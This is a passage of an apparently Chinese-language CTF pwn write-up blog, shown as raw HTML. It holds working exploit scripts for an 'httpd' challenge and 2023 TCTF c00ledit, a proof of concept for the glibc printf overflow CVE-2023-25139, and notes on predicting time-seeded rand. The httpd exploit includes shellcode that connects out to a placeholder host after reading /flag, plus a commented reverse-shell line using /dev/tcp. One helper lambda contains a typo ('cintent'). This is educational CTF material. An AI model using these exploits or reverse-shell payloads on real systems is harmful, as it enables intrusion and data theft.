class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;122.9.149.82&#x27;, 9999)</span></span><br><span class="line">p = process(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /init\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    rand = process(<span class="string">&#x27;get_rand&#x27;</span>)</span><br><span class="line">    value = rand.recv(<span class="number">13</span>)</span><br><span class="line">    rand.close()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setlocal</span>(<span class="params">data, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /setlocale?&#x27;</span> + data + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">name, pawd, uid, size, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /register?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;&amp;uid=&#x27;</span> + <span class="built_in">str</span>(uid) + <span class="string">&#x27;&amp;len=&#x27;</span> + <span class="built_in">str</span>(size) + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">data</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /test&#x27;</span> + data + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logoff</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /logoff?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /show?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, pawd, size, data, fd</span>):</span><br><span class="line">    pl = <span class="string">b&#x27;POST /note?&#x27;</span> + <span class="string">b&#x27;username=&#x27;</span> + name + <span class="string">b&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">b&#x27;\nContent-Length: &#x27;</span> + <span class="built_in">str</span>(size).encode() + <span class="string">b&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd).encode() + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    pl = <span class="string">&#x27;GET /poweroff\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">3</span>)<span class="comment">#放入unsorted以此泄露</span></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">show(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">1</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1f6ce0</span></span><br><span class="line"></span><br><span class="line">reg(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">setlocal(<span class="string">&#x27;=&#x27;</span> + <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line">reg(<span class="string">&#x27;a:b:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x10</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c:c:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x400</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system, binsh = get_sb()</span><br><span class="line">_IO_wfile_jumps = libc_base + <span class="number">0x1f3240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line"></span><br><span class="line">pl = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(environ) <span class="comment">#+ p64(0x400)</span></span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x1a32)&#x27;)</span></span><br><span class="line"></span><br><span class="line">show(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">stack = l64()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack - <span class="number">0xca0</span>) + p64(<span class="number">0x400</span>)</span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">rdi = libc_base + <span class="number">0x240e5</span></span><br><span class="line">rsi = libc_base + <span class="number">0x2573e</span></span><br><span class="line">rdx = libc_base + <span class="number">0x26302</span></span><br><span class="line">rax = libc_base + <span class="number">0x40123</span></span><br><span class="line">ret = libc_base + <span class="number">0x23159</span></span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#pl = p64(ret) + p64(rdi) + p64(stack - 0xca0 + 0x20) + p64(system)</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh -i &gt;&amp; /dev/tcp/x/x 0&gt;&amp;1\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = p64(rdi) + p64((stack &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span>) + p64(rsi) + p64(<span class="number">0x10000</span>) + p64(rdx) + p64(<span class="number">0x7</span>)</span><br><span class="line">pl += p64(mprotect) + p64(stack - <span class="number">0xca0</span> + <span class="number">0x40</span>)</span><br><span class="line">pl += asm(shellcraft.connect(<span class="string">&#x27;xx.xx.xx.xx.xx&#x27;</span>, xx) + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="number">2</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>, stdout)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<h2 id="CVE-2023-25139"><a href="#CVE-2023-25139" class="headerlink" title="CVE-2023-25139"></a>CVE-2023-25139</h2><p>原文链接:</p>
<p><a target="_blank" rel="noopener" href="https://sourceware.org/bugzilla/show_bug.cgi?id=30068">30068 – (CVE-2023-25139) incorrect printf output for integers with thousands separator and width field (CVE-2023-25139) (sourceware.org)</a></p>
<p>这个cve原理很简单</p>
<p>在glibc2.37的某些版本,例如Ubuntu GLIBC 2.37-0ubuntu1(<u>Ubuntu GLIBC 2.37-0ubuntu2就修复了</u>)</p>
<p>当调用<a href="`setlocale` 函数安装指定的系统本地环境或其一部分，作为新的 C 本地环境。修改保持效果，并影响所有关乎本地环境的 C 库函数执行，到下次调用 `setlocale` 为止。若 `locale` 为空指针，则 `setlocale` 查询当前 C 本地环境而不修改它。">setlocale函数</a></p>
<p>如果设置LC_NUMERIC或LC_ALL为一个含有千位分割符的地区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_CTYPE		 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NUMERIC		 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TIME		 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_COLLATE		 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MONETARY		 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MESSAGES		 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ALL		 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_PAPER		 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NAME		 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ADDRESS		 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TELEPHONE		10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MEASUREMENT	11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_IDENTIFICATION	12</span></span><br></pre></td></tr></table></figure>
<p>例如”en_US.UTF-8”</p>
<p>然后在使用格式化字符串时,如果有<strong>“%-‘nd”</strong>,即使用数字分隔符左对齐n个字符位格式化一个整型</p>
<p>那么整型有几个千位分隔符,格式化的结果就会多出几位</p>
<p>例如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>];</span><br><span class="line">  __builtin_memset (buf, <span class="string">&#x27;x&#x27;</span>, <span class="keyword">sizeof</span> (buf));</span><br><span class="line">  <span class="keyword">if</span> (setlocale (<span class="number">6</span>, <span class="string">&quot;en_US.UTF-8&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;1234567890123:\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;%-&#x27;13ld:\n&quot;</span>, <span class="number">1234567999L</span>);</span><br><span class="line">      <span class="built_in">sprintf</span> (buf, <span class="string">&quot;%0+ -&#x27;13ld:&quot;</span>, <span class="number">1234567L</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">printf</span> (<span class="string">&quot;%c&quot;</span>, buf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>output,两个千位分隔符所以多出两个字符位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1234567890123:</span><br><span class="line">+1,234,567     :</span><br><span class="line">+1,234,567     </span><br></pre></td></tr></table></figure>
<p>因此如果sprintf使用这个格式化字符串,就有可能会造成缓冲区溢出</p>
<p>特别是缓冲区大小刚好的时候,因为sprintf会在拼接的格式化字符串后面置’\0’</p>
<h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>当随机数函数的种子是由rand(time(0))生成的</p>
<p>time(0)精确到秒,是可以被预测</p>
<p>所以只要在本地同一时间运行一个相同的获得随机数代码</p>
<p>那么我们就可以预测到生成的随机数</p>
<h1 id="2023tctf-c00ledit"><a href="#2023tctf-c00ledit" class="headerlink" title="2023tctf-c00ledit"></a>2023tctf-c00ledit</h1><p><strong>标签:stdout泄露libc|有符号溢出|ROP</strong></p>
<p><strong>题目介绍:</strong>Try the “edit” feature.</p>
<p>程序只提供了两个功能</p>
<p><strong>add</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1354</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r12d</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v4 = num_dword_40E4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)num_dword_40E4 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enough!&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  ptr_qword_4060[v4] = v6;</span><br><span class="line">  *v6 = <span class="number">4096LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Current node: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">  ++num_dword_40E4;</span><br><span class="line">  <span class="keyword">return</span> a4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一次add item,会分配一个0x10chunk,用于记载大小和指针</p>
<p><strong>edit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 idx; <span class="comment">// rbp</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="string">&quot;No chance!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( edittime_dword_40E0 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v0 = <span class="string">&quot;Invalid index!&quot;</span>;</span><br><span class="line">  idx = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( !ptr_qword_4060[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  offset = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( offset + <span class="number">7</span> &gt;= *(_QWORD *)ptr_qword_4060[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Invalid offset!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, (<span class="type">void</span> *)(*(_QWORD *)(ptr_qword_4060[idx] + <span class="number">8LL</span>) + offset), <span class="number">8uLL</span>);<span class="comment">// vuln</span></span><br><span class="line">  ++edittime_dword_40E0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit时,能够自己指定edit的item和修改的偏移起始</p>
<p>程序没有输出item内容的功能</p>
<p>存在的漏洞点是,edit读入的下标索引的类型是有符号数,转化数字使用的是atol,也就是说没有对负数进行检测</p>
<p>因此如果item下标索引输入负数,就能够通过bss段上的stdout等指针修改对应的FILE结构体</p>
<p>又因为程序存在进入io链的输出函数,所以我们自然能够想到利用stdout泄露libc</p>
<p>通过IO_FILE的知识可以知道,当满足一些条件时能够输出__IO_write_base至__IO_write_ptr之间的内容</p>
<p>因此可以修改__IO_write_ptr指针</p>
<p>不过我们需要先对stdout的flag进行一些修改</p>
<p>它的flag&amp;_IO_CURRENTLY_PUTTING标志位应该为1,IO_NO_WRITES为0,其他另行判断</p>
<p>确保IO_OVERFLOW不会修改我们写入的IO_write_ptr</p>
<p>以此泄露出libc</p>
<p>再之后,官方题解是利用_IO_obstack_jumps这个vtable表</p>
<p>还有一些选手是利用修改libc.so的got.plt</p>
<p>不过我选择的是再次利用stdout泄露environ,打rop</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(cintent)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">		   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">	sla(<span class="string">b&#x27;Offset: &#x27;</span>,tbs(offset))</span><br><span class="line">	sa(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.231.174.57&#x27;,10101)</span></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">131</span>,p32(<span class="number">0xfbad0800</span>))</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f0</span>-<span class="number">2205568</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,p64(libc.sym[<span class="string">&#x27;__environ&#x27;</span>]+<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	p.recv()</span><br><span class="line">	</span><br><span class="line"><span class="comment">#p.recv(0x9f0+13)</span></span><br><span class="line">p.recv(<span class="number">0xa03</span>)</span><br><span class="line"></span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">24</span>,p64(stack-<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(libc.address+<span class="number">0x2a3e6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(libc.address+<span class="number">0x2a3e5</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<p>遇到使用索引却没有检测正负的都要当心</p>
<h1 id="2023tctf-无中生有"><a href="#2023tctf-无中生有" class="headerlink" title="2023tctf-无中生有"></a>2023tctf-无中生有</h1><p><strong>标签:elf|vdso|可执行栈</strong></p>
<p><strong>题目介绍:</strong></p>
<p>题目的意思很明确,让选手自己构建一个ELF上传到靶机运行</p>
<p>不过对ELF有不少要求</p>
<ol>
<li>大小有限制</li>
<li>必须是静态链接</li>
<li>不能有syscall和int 80h</li>
<li>每个段不能同时有写和执行的权限</li>
</ol>
<p>此外,启动ELF时还有继承的沙盒</p>
